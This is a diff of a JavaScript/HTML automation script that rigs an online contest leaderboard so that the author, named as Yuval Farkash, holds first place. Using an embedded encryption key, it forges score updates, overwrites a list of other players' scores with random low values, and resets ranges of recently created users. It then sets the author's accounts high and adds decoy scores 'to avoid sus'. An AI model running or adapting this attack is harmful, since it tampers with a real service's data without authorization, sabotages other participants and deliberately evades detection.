@@ -4,7 +4,7 @@
     <script src="https://tictac-winter.co.il/cryptojs-aes-format.js"></script>
     <script>
         // [*****] Globals
-        let first_place_name = "";
+        let first_place_is_me = false;
         let g_stop_all = false;
         let new_user = 0;
         const sleep_time = 60000;
@@ -21,7 +21,7 @@
                 // 0. If i'm already first, no need to automate anything...
                 update_score_impl(19999, 50 + (Math.round(Math.random() * 45) * 10));
                 await new Promise(r => setTimeout(r, 5000));    // Wait for response...
-                if (first_place_name == "Yuval Farkash" || first_place_name == "yuval farkash" || first_place_name == "יובל פרקש") {
+                if (first_place_is_me) {
                     console.debug("I'm already first place!!!");
                     await new Promise(r => setTimeout(r, sleep_time));
                     continue;
@@ -29,10 +29,26 @@
                     console.debug("Not first place. Let's break some stuff...");
                 }
 
-                // 1. Remove a lot of the new users, to avoid kiddies trying to win.
+                // 1. Remove only the annoying ones
+                [20771, 20853, 20962, 20963, 21087, 21234, 21250, 21317, 21477].forEach(u => {
+                    if (g_stop_all === false) {
+                        console.debug("Overwriting " + u);
+                        update_score_impl(u, 50 + (Math.round(Math.random() * 45) * 10));
+                    }
+                });
+                await new Promise(r => setTimeout(r, 5000));    // wait...
+                if (first_place_is_me) {
+                    console.debug("I'm now first place (2) !!!");
+                    await new Promise(r => setTimeout(r, sleep_time));
+                    continue;
+                } else {
+                    console.debug("Not first place. Let's continue...");
+                }
+
+                // 2. Remove a lot of the new users, to avoid kiddies trying to win.
                 //    Make sure to remove in chunks in order to avoid too much traffic.
-                //  1.a. Get latest userID using create_user
-                //  1.b. Remove x players from the latest using reset_users_range
+                //  2.a. Get latest userID using create_user
+                //  2.b. Remove x players from the latest using reset_users_range
                 create_user_impl('Gilad Efrati', '1234567890');
                 await new Promise(r => setTimeout(r, 5000));    // Wait for response...
                 if (new_user == 0) {
@@ -44,16 +60,24 @@
                 console.debug("[*] New user: " + latest_user);
 
                 for (let count = 0; count < 5; count++) {
-                    console.debug("[*] Remove 100's chunk: " + count);
-                    await reset_users_range_impl(latest_user, latest_user - 100);   // Remove only 100 users chunk
-                    if (first_place_name == "Yuval Farkash" || first_place_name == "yuval farkash" || first_place_name == "יובל פרקש") {
-                        break;
+                    if (g_stop_all === false) {
+                        console.debug("[*] Remove 100's chunk: " + count);
+                        await reset_users_range_impl(latest_user, latest_user - 100);   // Remove only 100 users chunk
+                        if (first_place_is_me) {
+                            console.debug("I'm now first place (2) !!!");
+                            break;
+                        }
+                        latest_user = latest_user - 100;
                     }
-                    latest_user = latest_user - 100;
                 }
-    
-                // 2. Set my own values, and remove annoying users that are not newly made.
-                await remove_annoying_users_impl([20771, 20853, 20962, 20963, 21087, 21234, 21250, 21317, 21477]);
+
+                // 2. Set my own values, with additional fakes to avoid sus
+                if (g_stop_all === false && first_place_is_me === false) {
+                    await update_my_users_impl();
+                    if (first_place_is_me) {
+                        console.debug("I'm now first place (3) !!!");
+                    }
+                }
 
                 // Sleep for 1 minutes.
                 await new Promise(r => setTimeout(r, sleep_time));
@@ -102,7 +126,7 @@
         }
 
         function update_score_impl(new_uid, new_score) {
-            first_place_name = "";
+            first_place_is_me = false;
             let form_data = new FormData();
             let USIDCTR = CryptoJSAesJson.encrypt(new_uid, "3hgqH9qSDtJxvlJ54fCqmPsDMw5bjSWze5pQER7tweHyts7ZQjrMqleHWj6i3dxYFUHx");
             let SCRCTR = CryptoJSAesJson.encrypt(new_score, "3hgqH9qSDtJxvlJ54fCqmPsDMw5bjSWze5pQER7tweHyts7ZQjrMqleHWj6i3dxYFUHx");
@@ -124,7 +148,12 @@
                         console.debug((i + 1).toString() + " place: " + _0x443239.topPlayers[i].fullname);
                     }
                     console.debug("position: " + _0x443239.myPosition);
-                    first_place_name = _0x443239.topPlayers[0].fullname;
+                    let first_place_name = _0x443239.topPlayers[0].fullname;
+                    if (first_place_name == "Yuval Farkash" || first_place_name == "yuval farkash" || first_place_name == "יובל פרקש") {
+                        first_place_is_me = true;
+                    } else {
+                        first_place_is_me = false;
+                    }
                     return _0x443239;
                 }
             };
@@ -142,29 +171,21 @@
             remove_annoying_users_impl(annoying_users);
         }
 
-        async function remove_annoying_users_impl(annoying_users) {
+        async function update_my_users_impl() {
             console.debug("============= Current time =============");
             console.debug(new Date().toString());
 
-            // Remove the annoying users
-            annoying_users.forEach(async u => {
-                if (g_stop_all === false) {
-                    console.debug("Overwriting " + u);
-                    update_score_impl(u, 50 + (Math.round(Math.random() * 45) * 10));
-                    // await new Promise(r => setTimeout(r, 1000));
-                }
-            });
-            await new Promise(r => setTimeout(r, 5000));    // wait...
-
-            // Only set my own users if I'm not 1st place. This is done in order to avoid suspicion
-            if (first_place_name == "") {
-                console.debug("********************************************************************************");
-                console.debug("!!!!!!!!!!! WEIRD ERROR !!!!!!!!!!!");
-                console.debug("********************************************************************************");
-            } else if (first_place_name == "Yuval Farkash" || first_place_name == "yuval farkash" || first_place_name == "יובל פרקש") {
-                return;
-            }
-
+            // Set random users in order to avoid sus
+            console.debug("Setting " + 20000);
+            update_score_impl(20000, 1260);
+            await new Promise(r => setTimeout(r, 2000));
+            console.debug("Setting " + 20001);
+            update_score_impl(20001, 1250);
+            await new Promise(r => setTimeout(r, 2000));
+            console.debug("Setting " + 20002);
+            update_score_impl(20002, 1270);
+            await new Promise(r => setTimeout(r, 2000));
+            // ------------------------------------------
             // Set my own users
             console.debug("Setting " + 19603);
             update_score_impl(19603, 1280);
@@ -178,13 +199,9 @@
 
             // If after setting those values, I am still not 1st, this means there's a user with higher score
             // than me that I didn't remove at any of the stages. This should be flagged as a problem!!!
-            if (first_place_name == "") {
-                console.debug("********************************************************************************");
-                console.debug("!!!!!!!!!!! WEIRD ERROR !!!!!!!!!!!");
-                console.debug("********************************************************************************");
-            } else if (first_place_name != "Yuval Farkash" && first_place_name != "yuval farkash" && first_place_name != "יובל פרקש") {
+            if (first_place_is_me === false) {
                 const header = document.createElement('h1');
-                header.textContent = 'Other winner: ' + first_place_name;
+                header.textContent = 'Other winner !!!';
                 header.style.color = 'blue';
                 header.style.textAlign = 'center';
                 document.getElementById('header-container').appendChild(header);
@@ -223,6 +240,9 @@
                 update_score_impl(i-3, 50 + (Math.round(Math.random() * 45) * 10));
                 update_score_impl(i-4, 50 + (Math.round(Math.random() * 45) * 10));
                 await new Promise(r => setTimeout(r, 500 + Math.floor(Math.random() * 100)));
+                if (first_place_is_me) {
+                    break;
+                }
             }
         }
 
